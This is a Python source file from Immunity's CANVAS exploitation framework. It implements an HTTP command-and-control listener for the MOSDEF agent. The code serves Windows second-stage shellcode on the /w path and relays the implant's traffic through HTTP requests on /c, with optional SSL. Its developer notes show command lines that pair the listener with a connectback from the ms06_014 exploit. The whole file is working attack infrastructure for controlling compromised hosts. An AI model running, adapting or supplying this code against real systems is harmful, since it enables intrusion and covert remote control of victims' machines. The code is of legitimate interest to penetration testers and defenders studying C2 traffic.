#!/usr/bin/env python

"""
http_mosdef.py

Emulate a socket object as HTTP in the way that MOSDEF needs

(C) Immunity, 2006
"""
import sys, os, signal
if "." not in sys.path: 
    sys.path.append(".")

from libs.spkproxy import header, body, MyConnection
from exploitutils import gzipBuffer

from threading import Thread
import thread

from exploitutils import *

import random
import struct
import mutex
import string

DEVNOTES = """

KNOWN ISSUES:

- when operating via a web proxy .. you will have to keep the node busy to
  prevent a connection time out .. only when the proxy does not follow
  keep-alive directions .. i.e. it works fine .. as long as you don't let
  the readfile connection time out .. this is not an issue with direct
  httpmosdef connections ..

TODO:

- find a solution for web proxies that don't adhere to keep-alive settings

COMMANDLINE EXAMPLE:

Listener (as root): 

# ./commandlineInterface.py -v 9 -p 80 -l 172.16.147.1

exploit (bind server to 8080, connectback to HTTP MOSDEF listener): 

$ ./exploits/httpserver/httpserver.py -O httpmosdef:1 -O 
singleexploit:ms06_014 -l 172.16.147.1 -d 80 -p 8080

"""

# maximum size of the outgoing packets
HTTP_MAX_SIZE=1024

# sigterm and sig int handler for the main thread
def sig(a, b):
    sys.exit(0)

class mosdef_http_client:
    """
    We pretend to be a very basic socket-like object
    But we also include a buffer and cache and support the
    http_mosdef object in handling us to get the data out
    and in.
    """
    def __init__(self):
        self.urlhost    = ""
        self.urlport    = 0
        self.ssl        = ""

        self.id         = None
        self.fd         = None
        self.inited     = False
        
        # thread safe by grace of mutexing ...
        self.outbuffer  = ""
        self.inbuffer   = ""

        self.timeout    = 5
        self.closed     = False

        self.lastoutlen = 0
        self.outMutex   = mutex.mutex()
        self.inMutex    = mutex.mutex()

        return
    
    def set_timeout(self, timeout):
        self.timeout = timeout
        return 
    
    def isactive(self):
        """
        If we have data in our inbuffer, we are "Active"
        and we can be read from
        else, we are not
        """
        if self.inbuffer!="":
            return True
        return False 
    
    # XXX: reliableread is lowest layer to recv()
    def recv(self, length):
        """ 
        transparent recv, as if we were a socket
        If we get ANY data, we return it, just like a socket
        Also, if we get NO data, we timeout, just like a normal socket
        that's how cool we are!
        """

        devlog("http_mosdef", "recv(%d) called on HTTP MOSDEF client object .."% length)

        # XXX: big time out for debug
        if not self.timeout:
            self.timeout = 40

        # when got_data unlocks the mutex on outbuffer
        # recv can aquire it and do it's thing .. keep
        # it locked for the next cycle !

        devlog("http_mosdef", "spinning on recv Mutex waiting for got_data() to be called ..")

        if len(self.inbuffer) == 0:
            gotsomedata = False
            for i in range(0, self.timeout * 10, 1):
                if self.inMutex.testandset() == True:
                    gotsomedata = True
                    break
                else:
                    time.sleep(0.1)
            if gotsomedata == False:
                raise timeoutsocket.Timeout
            
        # we got here, which means we have data in our inbuffer

        if len(self.inbuffer) == 0:
            #o ur buffer was cleared by another thread while we entered the mutex
            # we raise the timeout, since that's what's left
            raise timeoutsocket.Timeout

        # we have data in the buffer
        # take some data from the buffer
        data            = self.inbuffer[:length]
        # remove the data from the buffer
        self.inbuffer   = self.inbuffer[length:]

        # we keep the mutex locked, only got_data can unlock it
        self.inMutex.testandset()

        return data

    # XXX: writebuf is lowest layer to send()
    def send(self, data):
        """ 
        transparent send as if we were a socket
        """
        devlog("http_mosdef", "send called on HTTP-MOSDEF client object (%d bytes) .."% len(data))
        
        self.outbuffer += data
        # unlock the mutex so get_data can do it's thing and re-lock it
        self.outMutex.unlock()
        return len(data)
    
    def sendall(self, data):
        """
        Send all the data, or raise error of some kind
        """
        # XXX: This is not correct, since we assume all
        # XXX: sends send all the data, and that they all succeed
        ret = self.send(data)
        return ret 
    
    # get_data gets data into inbuffer
    def get_data(self, length=HTTP_MAX_SIZE):
        """ 
        Get data from our outbuffer 
        Will return empty string when no data is in our outbuffer
        """
        data = ""

        devlog("http_mosdef", "get_data(%d)"% length)

        # as soon a send() has added data to outbuffer
        # it will unlock the mutex .. get_data does it's thing
        # and keeps the mutex locked for the next cycle

        while len(self.outbuffer) < length:
            devlog("http_mosdef", "spinning on get_data Mutex waiting for send() to be called ..")

            # only while there is not enough data in the buffer
            # do we need to wait for an unlock()

            while self.outMutex.testandset() != True:
                time.sleep(0.1)

        # return all available data on length == 0

        if not length:
            data            = self.outbuffer
            self.outbuffer  = ""
            
        else:
            data            = self.outbuffer[:length]
            self.outbuffer  = self.outbuffer[len(data):]

        # keep the mutex locked .. only send unlocks it
        # we don't care if we return False ..

        self.outMutex.testandset()

        return data

    # send_data sends data to http client node
    def got_data(self, data):
        """ 
        add data to our inbuffer from the remote side
        """
        devlog("http_mosdef", "got_data(...) (%d bytes)"% len(data))

        self.inbuffer += data

        # unlock the inMutex so recv can work .. recv re-locks it
        self.inMutex.unlock()
        return len(data)

    # we need to be able to close() socket objects, even fake ones ;)
    def close():
        """
        close happens on this object ...
        """
        print "*** CloseForKostya v0.1 ***"
        return
        

# so we can thread off engine muck
class registerClient(Thread):
    def __init__(self, engine, client, parent, argsDict, type):
        Thread.__init__(self)
        self.engine         = engine
        self.last_client    = [client]
        self.parent         = parent
        self.argsDict       = argsDict
        self.type           = type
        self.initstring     = "" # to keep silica code happy
        return
    def run(self):
        self.engine.new_node_connection(self, self.last_client[-1])
    
class http_mosdef(Thread):
    """
    We emulate a listening socket, but in reality
    we are an http server.
    This is a canvasengine "listener"
    which means it has a parent of an Interface.
    """
    HALT        = "HALT"
    RUNNING     = "RUNNING"
    INACTIVE    = "Inactive"

    def __init__(self, host, port, ssl=False, engine=None, parent=None, bind_ip='0.0.0.0'):
        Thread.__init__(self)

        self.argsDict   = {} #for fromcreatethread, etc
        self.engine     = engine

        if parent.isNAT:
            self.log("[!] HTTP MOSDEF on NAT'd interface .. setting HTTP callback to %s" % parent.ip)
            self.localhost = parent.ip
        else:
            self.localhost = host

        self.port       = int(port)
        self.bind_ip    = bind_ip
        self.ipv6       = False 
        self.s          = None #no socket yet
        self.state      = self.INACTIVE
        self.clients    = {} #dictionary sorted by clientid (strings)

        self.last_client    = []
        self.useSSL         = ssl

        if self.useSSL == True:
            devlog('http_mosdef', 'Running HTTP MOSDEF in HTTPS mode ...')
            self.ssl_toggle = "s"
        else:
            self.ssl_toggle = ""

        self.debugInit          = True
        self.registeredClients  = []
 
        random.seed()
        from canvasengine import HTTPMOSDEF
        self.type   = HTTPMOSDEF
        self.parent = parent #this should be an Interface!
        self.closed = False 
        return 

    def close(self):
        """
        Shutdown this web server
        """
        self.closed = True
        self.state  = self.HALT
        return 

    def block_until_active(self):
        """
        defaultgui.py uses this function to not need a select() call
        We just block here, until we have a new client
        """
        self.accept()
        return 
    
    # needs to return our last client as it were a socket
    def accept(self):
        while self.last_client == []:
            time.sleep(5)
            print "Waiting for client .."
        return self.last_client.pop(),None
        
    def accept_mosdef(self):
        """
        """
        try:
            infd,addr   = self.s.accept()
            ret         = True 
        except timeoutsocket.Timeout, msg:
            #self.log("Timed out - no accept yet")
            ret = False 
        if ret:
            return infd,addr 
        return None, None 

    def listen(self):
        if not self.engine:
            self.log("No engine! Creating one")
            import canvasengine
            self.engine = canvasengine.canvasengine()
            
        s = gettcplistener(self.port, listenhost = self.bind_ip)
        
        if not s:
            if self.port < 1024:
                self.log("Cannot listen on port %d - perhaps we need to be root or that port is already bound? " \
                    "you can try to bind to a higher port" % self.port)
            else:
                self.log("Cannot listen on port %d - perhaps that port is already bound?" % self.port)
            return 0
        s.set_timeout(5)
        self.s = s 
        return True
    
    def log(self, msg):
        if self.engine:
            self.engine.log(msg)
        else:
            print msg
        return 
    
    def run(self):
        """
        
        """
        # we need a way for main thread SystemExit to kill children as well ..

        s = self.s
        if not s:
            self.log("Cannot run http_mosdef listener without listening")
            return 
        
        while 1:
            if self.state == self.HALT:
                break

            infd, addr = self.accept_mosdef()
            if infd in [-1,0, None]:
                continue

            # threading off the handle call so we can handle multiple callbacks
            thread.start_new_thread(self.handle, (infd, addr, thread.allocate_lock()))

        return

    def get_new_client_id(self):
        " inits a newly id'd client object "

        client = mosdef_http_client()

        if self.useSSL == True:
            print "[!] Initing HTTPS MOSDEF Client .."
            client.ssl = "s"

        # lock mutexes for in and out on client init ..
        client.inMutex.testandset()
        client.outMutex.testandset()

        client.id = "%X"% random.randint(0, 0xffffff)
        self.clients[client.id] = client
        self.last_client.append(client)
        return client.id

    def getHTTPStage2(self, httpHost, httpPort, ssl=""):
        " get the full protocol HTTP code over and a client id "

        from shellcode import shellcodeGenerator

        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp", {"subespval": 0x1000 })

        args = {}
        # now it switches to a /c with the client id
        # and the protocol switches to double GETS
        args["URL"] = "http%s://%s:%d/c"%(ssl, httpHost, httpPort)
        devlog("http_mosdef","[!] getting new client ID ..")
        
        # XXX: is fine as the parent function (handle) is threaded and lock protected
        args["ID"] = self.get_new_client_id()

        self.last_client[-1].urlhost    = httpHost
        self.last_client[-1].urlport    = httpPort
        self.last_client[-1].ssl        = ssl

        sc.addAttr("httpGetShellcode", args)

        devlog("http_mosdef", "client connect url: %s client id: %s"% (args["URL"], args["ID"]))
        return sc.get()

    def get_client(self, clientid):
        return self.clients.get(clientid)
    
    def handle(self, infd, addr, lock=None): 
        """
        handle a connection
        """
        
        # enter critical section .. considering Python is not really threaded
        # you have to sleep after releasing a lock .. so other threads can enter
        
        lock.acquire()
        
        devlog("http_mosdef", "Handling incoming HTTP-MOSDEF connection")

        clientheader = header(state="SERVER")

        devlog('http_mosdef', 'Setting header.useSSL to %d' % self.useSSL)
        clientheader.useSSL = self.useSSL

        # wrap our fd in SPIKE MyConnection object that can do SSL
        if self.useSSL == True:
            spike_fd = MyConnection(infd, directSSL=True) # we dont want SPIKE proxy to behave like a proxy :>
            devlog('http_mosdef', 'Starting SPIKE SSL Server Layer ...')
            ret = spike_fd.startSSLserver()
            if ret == False:
                devlog('http_mosdef', 'Failed to start SPIKE SSL Server Layer ...')
            else:
                devlog('http_mosdef', 'Succesfully started SPIKE SSL Server Layer ...')
        else:
            devlog('http_mosdef', 'Not Starting SPIKE SSL Server Layer ...')           
            spike_fd = infd # just direct fd access for regular HTTP MOSDEF

        ret = clientheader.readdata(spike_fd)

        clientbody = body()
        if clientheader.gotGoodHeader():
            devlog("http_mosdef", "Got good HTTP-MOSDEF request")
                
            if clientheader.bodySize() > 0 or clientheader.wasChunked:
                self.log("Reading body")
                #readtillclosed always 0 on client
                clientbody.read(spike_fd, clientheader.bodySize(), clientheader.wasChunked, 0)
                self.log("Read body")
        else:
            self.log("Invalid header recved: %s"%repr(clientheader.data))
            lock.release() # release lock
            time.sleep(0.1) # critical section exit sleep
            return False 
                
        h = header("SERVER")
        b = body()                

        devlog("http_mosdef", "Clientheader.URL = %s"% prettyprint(clientheader.URL))

        if clientheader.URL == "/w":
            # send windows second stage payload
            # when we get a request that has no ID
            # and starts with /w (windows)
            h.status    = "200"
            ip          = addr[0]

            # XXX: ssl is turned on by ssl="s"
            devlog('http_mosdef', 'get main stage2 response payload')
            newbody = self.getHTTPStage2(self.localhost, self.port, ssl=self.ssl_toggle)
            devlog('http_mosdef', 'pre-setBody')
            newbody = intel_order(len(newbody)) + newbody
            b.setBody(newbody)
            devlog('http_mosdef', 'set main stage2 response payload')
            
        elif clientheader.URL[:2] == "/c":
            devlog("http_mosdef", "Connected client: %s"% clientheader.URL)
            clientid = clientheader.URL.split("/")[-1]

            if not self.get_client(clientid):
                devlog("http_mosdef", "client id %s not found! not handling request"% clientid)
                spike_fd.close()
                lock.release() # release lock
                time.sleep(0.1) # critical section exit sleep
                return
            
            if "MD" in clientheader.headerValuesDict:

                devlog("http_mosdef", "Got MOSDEF reply data from client (MD header) %s"% clientid)
                data = clientheader.getStrValue(["MD"])
                self.get_client(clientid).got_data(data)
                
                # return after got data, no need to respond to anything
                spike_fd.close()
                lock.release() # lock release
                time.sleep(0.1) # critical section exit sleep
                return

            elif clientbody.mysize != 0 and "SZ" not in clientheader.headerValuesDict:

                # when we switch to our full protocol MD data is just body data .. SZ indicates a client read
                # body data without a SZ indicates a client send

                devlog("http_mosdef", "Got MOSDEF reply data from client (body data) %s"% clientid)
                self.get_client(clientid).got_data("".join(clientbody.data))

                # return after got data, no need to respond
                spike_fd.close()
                lock.release() # lock release
                time.sleep(0.1) # critical section exit sleep
                return

            elif clientbody.mysize == 0 and "SZ" not in clientheader.headerValuesDict:

                # this happens sometimes .. consider it a "" send .. weird .. probably want to
                # handle sends of 0 as a straight return in win32remoteresolver.py

                devlog("http_mosdef", "Got zero MOSDEF data body!")
                spike_fd.close()
                lock.release() # lock release
                time.sleep(0.1) # critical section exit sleep
                return

            # client _wants_ data ..

            else:

                # if a client isn't registered yet .. we want the startup to happen on the first /c data get

                if self.last_client != [] and self.last_client[-1].id not in self.registeredClients:
                    devlog("http_mosdef", "We got a new client and it's time to tell the engine about it")
                    if self.engine:
                        self.log("Registering our new client with the engine")
                        self.registeredClients.append(self.last_client[-1].id)
                        registerClient(self.engine, self.last_client[-1], self.parent, self.argsDict, self.type).start() # spawn it's own thread

                devlog("http_mosdef", "client is asking for data !")

                # we have a mutex mechanism in get_data that will do the wait for us .. theoretically

                wantedSize = 0
                if "SZ" in clientheader.headerValuesDict:

                    # SZ header means we know how much data we want from our outbuf

                    if clientbody.mysize == 0:
                        # we got our size from a shellcode based GET .. these use the simple GET scheme
                        # and have the size in a SZ header ..

                        devlog("http_mosdef", "itoa SZ header got .. %s"% clientheader.getStrValue(["SZ"]))
                        wantedSize = string.atoi(clientheader.getStrValue(["SZ"]), base=16) 

                    else:
                        # we got our size from a MOSDEF-C read .. these have the size val as body data
                        clear = "".join(clientbody.data)[:4]
                        try:
                            wantedSize = struct.unpack("<L", clear)[0]
                        except:
                            devlog("http_mosdef", "XXX: UNPACK FAILED ! FATAL !")
                            spike_fd.close()
                            lock.release() # lock release
                            time.sleep(0.1) # critical section exit sleep
                            return

                    devlog("http_mosdef", "HTTP-MOSDEF client wants %d bytes of data"% wantedSize)

                # length of 0 gets _all_ available data in outbuffer

                # mutex wait in place .. get_data waits for send to unlock a mutex ;)
                data = self.get_client(clientid).get_data(length=wantedSize)
                if data:
                    devlog("http_mosdef", "returning client data length %d (0 sends all available)"% wantedSize)
                    b.setBody(data)
                else:
                    devlog("http_mosdef", "XXX: mutex wait failed !!!")
            
        devlog("http_mosdef", "Server Header Constructing")

        servheader,servbody = h, b
        if clientheader.cangzip:
            servheader.setcanzip(clientheader)
        
        bodydata = "".join(servbody.data)
        if servheader.cangzip and exploit.cangzip:
            bodydata = gzipBuffer(bodydata)
            servheader.addHeader("Content-Encoding","gzip")

        # now we respond...
        response  = ""
        response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
        
        for akey in servheader.headerValuesDict.keys():
            if akey not in [ "Content-Length", "Content-length"]:
                response += servheader.grabHeader(akey)

        devlog("http_mosdef", "Sending header data of %d bytes"% len(response))

        chunked = 0
        if not chunked:
            response += "Content-Length: " + str( len(bodydata) ) + "\r\n"

        response += "\r\n"
        response += "".join(bodydata)

        devlog("http_mosdef", "Total response length is %d bytes"%len(response))

        try:
            devlog('http_mosdef', '!!! before sendall ...')
            spike_fd.send(response)
        except socket.error:
            devlog('http_mosdef', 'XXX !!!')
            devlog("http_mosdef", "Connection closed by peer")
        
        devlog("http_mosdef", "closing HTTP-MOSDEF client handler")

        spike_fd.close()
        lock.release() # lock release
        time.sleep(0.1) # critical section exit sleep ..
        return 

def main(host, port):
    hm = http_mosdef(host, port)
    hm.listen()
    hm.run()
    return

if __name__=="__main__":
    import sys
    host = sys.argv[1]
    port = int(sys.argv[2])
    main(host, port)
    
    
